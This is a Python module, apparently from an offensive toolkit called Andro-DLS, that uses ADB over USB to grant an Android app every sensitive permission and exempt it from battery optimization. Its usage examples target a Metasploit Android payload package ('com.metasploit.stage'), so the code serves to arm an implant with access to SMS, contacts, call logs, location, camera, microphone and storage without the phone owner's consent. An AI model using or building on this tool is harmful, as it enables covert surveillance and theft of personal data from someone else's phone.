#!/usr/bin/env python3
"""
Andro-DLS — USB Permission Manager

When device is connected via USB cable with debugging enabled,
grant/revoke/check runtime permissions for any installed app.

This works because ADB shell has shell (uid=2000) which can grant
permissions to any app without user interaction.

Usage:
    python3 modules/usb_permissions.py grant com.metasploit.stage --all
    python3 modules/usb_permissions.py revoke com.metasploit.stage --all
    python3 modules/usb_permissions.py check com.whatsapp
    python3 modules/usb_permissions.py list com.metasploit.stage
"""

import subprocess
import sys


# All dangerous/signature permissions we care about
ALL_PERMISSIONS = [
    # SMS
    "android.permission.READ_SMS",
    "android.permission.SEND_SMS",
    "android.permission.RECEIVE_SMS",
    "android.permission.RECEIVE_MMS",
    "android.permission.RECEIVE_WAP_PUSH",
    # Contacts
    "android.permission.READ_CONTACTS",
    "android.permission.WRITE_CONTACTS",
    "android.permission.GET_ACCOUNTS",
    # Phone
    "android.permission.READ_PHONE_STATE",
    "android.permission.READ_PHONE_NUMBERS",
    "android.permission.CALL_PHONE",
    "android.permission.ANSWER_PHONE_CALLS",
    "android.permission.ADD_VOICEMAIL",
    "android.permission.USE_SIP",
    "android.permission.PROCESS_OUTGOING_CALLS",
    # Call Log
    "android.permission.READ_CALL_LOG",
    "android.permission.WRITE_CALL_LOG",
    # Location
    "android.permission.ACCESS_FINE_LOCATION",
    "android.permission.ACCESS_COARSE_LOCATION",
    "android.permission.ACCESS_BACKGROUND_LOCATION",
    # Camera
    "android.permission.CAMERA",
    # Microphone
    "android.permission.RECORD_AUDIO",
    # Storage (legacy)
    "android.permission.READ_EXTERNAL_STORAGE",
    "android.permission.WRITE_EXTERNAL_STORAGE",
    # Storage (Android 13+)
    "android.permission.READ_MEDIA_IMAGES",
    "android.permission.READ_MEDIA_AUDIO",
    "android.permission.READ_MEDIA_VIDEO",
    "android.permission.READ_MEDIA_VISUAL_USER_SELECTED",
    # Sensors
    "android.permission.BODY_SENSORS",
    "android.permission.BODY_SENSORS_BACKGROUND",
    "android.permission.ACTIVITY_RECOGNITION",
    # Notifications
    "android.permission.POST_NOTIFICATIONS",
    # Nearby devices
    "android.permission.BLUETOOTH_CONNECT",
    "android.permission.BLUETOOTH_SCAN",
    "android.permission.NEARBY_WIFI_DEVICES",
    # Special
    "android.permission.SYSTEM_ALERT_WINDOW",
    "android.permission.WRITE_SETTINGS",
    "android.permission.REQUEST_INSTALL_PACKAGES",
    "android.permission.MANAGE_EXTERNAL_STORAGE",
    "android.permission.ACCESS_MEDIA_LOCATION",
    "android.permission.USE_FULL_SCREEN_INTENT",
    "android.permission.SCHEDULE_EXACT_ALARM",
    "android.permission.ACCESS_NOTIFICATION_POLICY",
    # Network
    "android.permission.INTERNET",
    "android.permission.ACCESS_NETWORK_STATE",
    "android.permission.ACCESS_WIFI_STATE",
    "android.permission.CHANGE_WIFI_STATE",
    "android.permission.CHANGE_NETWORK_STATE",
    # Power
    "android.permission.WAKE_LOCK",
    "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
    "android.permission.FOREGROUND_SERVICE",
    "android.permission.FOREGROUND_SERVICE_DATA_SYNC",
    "android.permission.FOREGROUND_SERVICE_SPECIAL_USE",
    # Boot
    "android.permission.RECEIVE_BOOT_COMPLETED",
]

# Grouped by category for easier management
PERMISSION_GROUPS = {
    "sms": [
        "android.permission.READ_SMS",
        "android.permission.SEND_SMS",
        "android.permission.RECEIVE_SMS",
        "android.permission.RECEIVE_MMS",
        "android.permission.RECEIVE_WAP_PUSH",
    ],
    "contacts": [
        "android.permission.READ_CONTACTS",
        "android.permission.WRITE_CONTACTS",
        "android.permission.GET_ACCOUNTS",
    ],
    "phone": [
        "android.permission.READ_PHONE_STATE",
        "android.permission.READ_PHONE_NUMBERS",
        "android.permission.CALL_PHONE",
        "android.permission.ANSWER_PHONE_CALLS",
        "android.permission.READ_CALL_LOG",
        "android.permission.WRITE_CALL_LOG",
    ],
    "location": [
        "android.permission.ACCESS_FINE_LOCATION",
        "android.permission.ACCESS_COARSE_LOCATION",
        "android.permission.ACCESS_BACKGROUND_LOCATION",
    ],
    "camera": [
        "android.permission.CAMERA",
    ],
    "audio": [
        "android.permission.RECORD_AUDIO",
    ],
    "storage": [
        "android.permission.READ_EXTERNAL_STORAGE",
        "android.permission.WRITE_EXTERNAL_STORAGE",
        "android.permission.READ_MEDIA_IMAGES",
        "android.permission.READ_MEDIA_AUDIO",
        "android.permission.READ_MEDIA_VIDEO",
        "android.permission.MANAGE_EXTERNAL_STORAGE",
        "android.permission.ACCESS_MEDIA_LOCATION",
    ],
    "notifications": [
        "android.permission.POST_NOTIFICATIONS",
    ],
    "special": [
        "android.permission.SYSTEM_ALERT_WINDOW",
        "android.permission.WRITE_SETTINGS",
        "android.permission.REQUEST_INSTALL_PACKAGES",
        "android.permission.SCHEDULE_EXACT_ALARM",
        "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
    ],
    "all": ALL_PERMISSIONS,
}


def run_adb(*args, serial=None, timeout=15):
    """Run ADB command."""
    cmd = ["adb"]
    if serial:
        cmd += ["-s", serial]
    cmd += list(args)
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip(), r.returncode
    except subprocess.TimeoutExpired:
        return "", -1


def device_connected(serial=None):
    """Check if device is connected."""
    out, rc = run_adb("shell", "getprop", "ro.build.version.release", serial=serial)
    return rc == 0


def grant_permissions(pkg, groups="all", serial=None):
    """Grant permissions to a package."""
    if isinstance(groups, str) and groups == "all":
        perms = ALL_PERMISSIONS
    elif isinstance(groups, str):
        perms = PERMISSION_GROUPS.get(groups, [])
    elif isinstance(groups, list):
        perms = groups
    else:
        print(f"❌ Unknown group: {groups}")
        return 0

    granted = 0
    failed = 0

    for perm in perms:
        out, rc = run_adb("shell", "pm", "grant", pkg, perm, serial=serial)
        if rc == 0:
            granted += 1
            perm_short = perm.replace("android.permission.", "")
            print(f"  ✅ {perm_short}")
        else:
            failed += 1
            # Only show failures for non-normal permissions
            if "SecurityException" in out or "denied" in out.lower():
                perm_short = perm.replace("android.permission.", "")
                print(f"  ❌ {perm_short}: {out[:80]}")

    print(f"\n  Results: {granted} granted, {failed} failed/skipped")
    return granted


def revoke_permissions(pkg, groups="all", serial=None):
    """Revoke permissions from a package."""
    if isinstance(groups, str) and groups == "all":
        perms = ALL_PERMISSIONS
    elif isinstance(groups, str):
        perms = PERMISSION_GROUPS.get(groups, [])
    elif isinstance(groups, list):
        perms = groups
    else:
        print(f"❌ Unknown group: {groups}")
        return 0

    revoked = 0
    for perm in perms:
        out, rc = run_adb("shell", "pm", "revoke", pkg, perm, serial=serial)
        if rc == 0:
            revoked += 1

    print(f"  Revoked {revoked}/{len(perms)} permissions")
    return revoked


def check_permissions(pkg, serial=None):
    """Show all permissions for a package."""
    out, rc = run_adb("shell", "dumpsys", "package", pkg, serial=serial)
    if rc != 0:
        print(f"❌ Package not found: {pkg}")
        return

    granted = []
    denied = []
    requested = []

    in_declared = False
    in_runtime = False
    in_install = False

    for line in out.split("\n"):
        stripped = line.strip()

        if "declared permissions:" in stripped:
            in_declared = True
            in_runtime = False
            in_install = False
            continue
        if "requested permissions:" in stripped:
            in_declared = False
            in_runtime = True
            in_install = False
            continue
        if "install permissions:" in stripped:
            in_declared = False
            in_runtime = False
            in_install = True
            continue
        if "User " in stripped and "actions:" not in stripped:
            in_declared = False
            in_runtime = False
            in_install = False
            continue

        if stripped.startswith("android.permission."):
            if "granted=true" in stripped:
                granted.append(stripped.split(":")[0])
            elif "granted=false" in stripped:
                denied.append(stripped.split(":")[0])

            if in_runtime:
                requested.append(stripped.split(":")[0])

    print(f"\n  Package: {pkg}")
    print(f"  Requested: {len(requested)}")
    print(f"  Granted: {len(granted)}")
    print(f"  Denied: {len(denied)}")
    print()

    if granted:
        print("  GRANTED:")
        for p in sorted(granted):
            short = p.replace("android.permission.", "")
            print(f"    ✅ {short}")

    if denied:
        print("\n  DENIED:")
        for p in sorted(denied):
            short = p.replace("android.permission.", "")
            print(f"    ❌ {short}")

    return {"granted": granted, "denied": denied, "requested": requested}


def whitelist_battery(pkg, serial=None):
    """Add package to battery optimization whitelist."""
    out, rc = run_adb("shell", "dumpsys", "deviceidle", "whitelist", f"+{pkg}", serial=serial)
    if rc == 0:
        print(f"  ✅ {pkg} whitelisted from battery optimization")
        return True
    print(f"  ⚠ Battery whitelist: {out}")
    return False


def run_manager(action, pkg, groups="all", serial=None):
    """Main entry point."""
    print("=" * 60)
    print("  Andro-DLS — USB Permission Manager")
    print("=" * 60)
    print()

    if not device_connected(serial):
        print("❌ No device connected. Enable USB debugging and connect via cable.")
        return False

    # Get Android version for compatibility
    out, _ = run_adb("shell", "getprop", "ro.build.version.release", serial=serial)
    print(f"Device connected — Android {out}")
    print(f"Target: {pkg}")
    print()

    if action == "grant":
        print(f"Granting {groups} permissions to {pkg}...")
        count = grant_permissions(pkg, groups, serial)
        if count > 0:
            whitelist_battery(pkg, serial)
        return count > 0

    elif action == "revoke":
        print(f"Revoking {groups} permissions from {pkg}...")
        count = revoke_permissions(pkg, groups, serial)
        return count > 0

    elif action == "check":
        check_permissions(pkg, serial)
        return True

    elif action == "list":
        # List all permissions for the package in a clean format
        out, rc = run_adb("shell", "dumpsys", "package", pkg, serial=serial)
        if rc == 0:
            print(f"  {pkg} permissions:")
            for line in out.split("\n"):
                if "android.permission." in line:
                    print(f"    {line.strip()}")
        return True

    else:
        print(f"❌ Unknown action: {action}")
        print("   Actions: grant, revoke, check, list")
        return False


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Andro-DLS USB Permission Manager")
    parser.add_argument("action", choices=["grant", "revoke", "check", "list"],
                        help="Action to perform")
    parser.add_argument("package", help="Target package name")
    parser.add_argument("-g", "--group", default="all",
                        help="Permission group: all, sms, contacts, phone, location, camera, audio, storage, notifications, special")
    parser.add_argument("-s", "--serial", help="Device serial")
    args = parser.parse_args()

    run_manager(args.action, args.package, groups=args.group, serial=args.serial)
